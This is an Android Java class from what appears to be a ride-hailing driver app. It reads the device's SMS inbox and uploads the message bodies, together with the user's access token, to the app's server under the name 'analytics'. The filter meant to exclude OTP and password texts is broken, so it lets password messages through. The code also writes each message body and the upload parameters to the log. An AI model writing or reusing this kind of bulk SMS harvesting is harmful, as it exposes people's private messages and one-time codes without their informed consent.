package product.clicklabs.jugnoo.driver;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;

import product.clicklabs.jugnoo.driver.datastructure.ApiResponseFlags;
import product.clicklabs.jugnoo.driver.retrofit.RestClient;
import product.clicklabs.jugnoo.driver.retrofit.model.RegisterScreenResponse;
import product.clicklabs.jugnoo.driver.utils.AppStatus;
import product.clicklabs.jugnoo.driver.utils.Log;
import product.clicklabs.jugnoo.driver.utils.Prefs;
import retrofit.Callback;
import retrofit.RetrofitError;
import retrofit.client.Response;
import retrofit.mime.TypedByteArray;

/**
 * Created by shankar on 2/5/16.
 */
public class FetchAndSendMessages extends AsyncTask<String, Integer, ArrayList<String>>{

	private final String TAG = FetchAndSendMessages.class.getSimpleName();

	private final String KEYWORD_OTP = "otp",
			KEYWORD_PASSWORD = "PASSWORD";

	//booking tfs
	//say ola to your driver

	private final long WEEK_MILLIS = 7 * 24 * 60 * 60 * 1000,
	DAY_MILLIS = 24 * 60 * 60 * 1000;

	private Context context;
	private String accessToken;

	public FetchAndSendMessages(Context context, String accessToken){
		this.context = context;
		this.accessToken = accessToken;
	}
	@Override
	protected void onPreExecute() {
		super.onPreExecute();
	}

	@Override
	protected ArrayList<String> doInBackground(String... params) {
		try {
			long defaultTime = System.currentTimeMillis() - WEEK_MILLIS;
			long currentTime = System.currentTimeMillis();
			long lastTime = Prefs.with(context).getLong(Constants.SP_ANALYTICS_LAST_MESSAGE_READ_TIME, defaultTime);
			if((currentTime - lastTime) >= DAY_MILLIS){
				return fetchMessages(lastTime);
			} else{
				return null;
			}
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	@Override
	protected void onPostExecute(ArrayList<String> s) {
		super.onPostExecute(s);
		try {
			if(s != null && s.size() > 0){
				if(AppStatus.getInstance(context).isOnline(context)){
					HashMap<String, String> params = new HashMap<>();
					params.put(Constants.KEY_ACCESS_TOKEN, accessToken);
					JSONArray jObj = new JSONArray();
					for(String str : s){
						jObj.put(str);
					}
					params.put(Constants.KEY_ANALYTICS_SMS_LIST, jObj.toString());

					Log.i(TAG, "params before api=" + params);

					RestClient.getApiServices().uploadAnalyticsMessages(params, new Callback<RegisterScreenResponse>() {
						@Override
						public void success(RegisterScreenResponse registerScreenResponse, Response response) {
							try {
								String responseStr = new String(((TypedByteArray) response.getBody()).getBytes());
								JSONObject jObj = new JSONObject(responseStr);
								int flag = jObj.optInt(Constants.KEY_FLAG, ApiResponseFlags.ACTION_FAILED.getOrdinal());
								if (ApiResponseFlags.ACTION_COMPLETE.getOrdinal() == flag) {
									Prefs.with(context).save(Constants.SP_ANALYTICS_LAST_MESSAGE_READ_TIME, System.currentTimeMillis());
								}
							} catch (Exception e) {
								e.printStackTrace();
							}
						}

						@Override
						public void failure(RetrofitError error) {
						}
					});
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private ArrayList<String> fetchMessages(long lastTime) {
		ArrayList<String> messages = new ArrayList<>();
		try {
			Uri uri = Uri.parse("content://sms/inbox");
			String[] selectionArgs = new String[]{Long.toString(lastTime)};
			String selection = "date" + ">?";
			Cursor cursor = context.getContentResolver().query(uri, null, selection, selectionArgs, null);

			if (cursor != null) {
				for (cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()) {
					String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
					Log.i(TAG, "sms body=>" + body);
					try {
						if(!((body.toLowerCase().contains(KEYWORD_OTP) && body.toLowerCase().contains(KEYWORD_OTP))
							||(body.toLowerCase().contains(KEYWORD_PASSWORD) && body.toLowerCase().contains(KEYWORD_PASSWORD)))){
							messages.add(body);
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
			if (cursor != null){
				cursor.close();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return messages;
	}
}